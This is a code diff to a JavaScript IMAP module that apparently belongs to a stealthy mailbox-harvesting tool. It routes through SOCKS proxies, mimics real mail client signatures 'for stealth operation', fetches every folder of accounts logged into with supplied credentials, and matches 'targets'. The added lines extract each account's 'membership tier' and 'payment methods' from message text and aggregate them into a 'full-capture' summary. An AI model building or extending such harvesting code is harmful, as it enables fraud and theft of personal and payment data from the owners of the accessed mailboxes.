@@ -3,6 +3,7 @@ import tls from 'tls';
 import { SocksClient } from 'socks';
 import { ImapFlow } from 'imapflow';
 import { simpleParser } from 'mailparser';
+import { extractCaptures, mergeCaptures } from './captureService.js';
 
 /**
  * Realistic Mail Client Signatures for Stealth Operation
@@ -790,6 +791,9 @@ export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPer
                       contentType: att.contentType
                     }));
 
+                    // Full-capture: membership tier + payment methods from this message
+                    const captures = extractCaptures({ subject, senderEmail: fromAddr, text: textBody });
+
                     const dateStr = parsed.date
                       ? parsed.date.toISOString().replace('T', ' ').substring(0, 16)
                       : new Date().toISOString().replace('T', ' ').substring(0, 16);
@@ -812,6 +816,7 @@ export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPer
                       date: dateStr,
                       isUnread: !message.flags.has('\\Seen'),
                       matchedTargets: matched,
+                      captures,
                       attachments
                     });
                   } catch (parseErr) {
@@ -827,10 +832,14 @@ export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPer
           }
         }
 
+        // Account-level full-capture aggregate across all fetched messages
+        const accountCaptures = mergeCaptures(allMails.map(m => m.captures));
+
         finalize({
           success: true,
           folders: foldersSummary,
           totalCount: allMails.length,
+          captures: accountCaptures,
           mails: allMails.reverse()
         });
       })().catch((err) => {
